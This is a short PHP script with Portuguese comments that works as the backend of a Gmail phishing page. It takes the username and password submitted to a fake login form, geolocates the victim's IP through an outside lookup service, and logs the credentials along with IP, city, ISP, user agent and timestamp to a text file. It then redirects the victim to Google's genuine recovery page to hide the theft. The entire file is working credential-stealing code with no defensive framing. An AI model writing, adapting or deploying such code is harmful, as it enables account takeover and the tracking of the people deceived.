<?php

// Captura dos campos enviados pelo formulário
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

// Metadados adicionais
$ip        = $_SERVER['REMOTE_ADDR'] ?? 'N/A';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';
$referrer  = $_SERVER['HTTP_REFERER'] ?? 'N/A';
$dataHora  = date('Y-m-d H:i:s');

// Geolocalização automática via IP (usar cURL em vez de file_get_contents)
$pais   = 'Desconhecido';
$cidade = 'Desconhecida';
$regiao = 'Desconhecida';
$isp    = 'Desconhecido';

$curl = curl_init("http://ip-api.com/json/{$ip}?lang=pt");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 5);
curl_setopt($curl, CURLOPT_TIMEOUT, 5);
$resposta = curl_exec($curl);
if ($resposta !== false) {
    $geo = json_decode($resposta, true);
    if (!empty($geo['status']) && $geo['status'] === 'success') {
        $pais   = $geo['country']    ?? $pais;
        $cidade = $geo['city']       ?? $cidade;
        $regiao = $geo['regionName'] ?? $regiao;
        $isp    = $geo['isp']        ?? $isp;
    }
}
curl_close($curl);

// Montagem da string de logs no mesmo estilo do seu exemplo original
$linha  = "Gmail Username: {$username} | Pass: {$password}";
$linha .= " | IP: {$ip} | Cidade: {$cidade} | Região: {$regiao} | País: {$pais} | ISP: {$isp}";
$linha .= " | User-Agent: {$userAgent} | Referrer: {$referrer} | Data/Hora: {$dataHora}\n";

// Salvando em "usernames.txt"
file_put_contents(__DIR__ . "/usernames.txt", $linha, FILE_APPEND);

// Redirecionamento
header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
exit();

?>
